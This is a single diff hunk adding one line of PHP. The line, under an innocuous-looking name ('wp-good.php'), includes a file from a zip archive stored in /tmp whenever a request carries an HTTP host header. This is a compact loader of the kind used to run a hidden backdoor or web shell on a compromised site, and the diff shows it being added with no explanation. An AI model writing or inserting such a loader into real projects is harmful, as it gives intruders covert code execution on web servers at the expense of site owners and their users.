@@ -1,0 +1,1 @@
+<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "wp-good.php"; include("zip:///tmp/phpWqO0Pi#$h");?>
